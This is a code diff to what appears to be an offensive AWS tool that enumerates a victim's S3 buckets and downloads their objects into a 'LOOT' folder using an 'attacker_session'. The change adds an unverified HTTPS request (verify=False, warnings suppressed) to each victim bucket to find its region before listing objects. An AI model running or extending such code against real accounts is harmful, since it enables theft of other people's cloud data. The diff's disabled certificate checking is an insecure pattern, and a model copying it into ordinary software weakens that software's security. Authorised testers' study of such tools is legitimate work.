@@ -1,11 +1,13 @@
-import json,sys,os,shutil
+import json,sys,os,shutil,requests,urllib3
 import modules.globals as my_globals
 from colorama import Fore
 from modules.utils import custom_serializer
 from aws_assume_role_lib import assume_role
 from botocore.exceptions import ClientError
+from urllib3.exceptions import InsecureRequestWarning
 
 BASE_DOWNLOAD_PATH = "LOOT/S3_Buckets/"
+urllib3.disable_warnings(InsecureRequestWarning)
 
 def s3_init_enum(victim_s3_client, attacker_session):
     buckets = my_globals.victim_buckets
@@ -102,6 +104,10 @@ def download_bucket_objects(s3_client, buckets):
     for bucket in buckets:
         try:
             print(f"{Fore.CYAN}Processing bucket: {bucket}")
+            response = requests.get(f'https://{bucket}.s3.amazonaws.com', verify=False)
+            bucket_region = response.headers['x-amz-bucket-region']
+
+            print(f"{Fore.CYAN} | Bucket Region: {bucket_region}")
 
             objects = s3_client.list_objects_v2(Bucket=bucket).get("Contents", [])
 
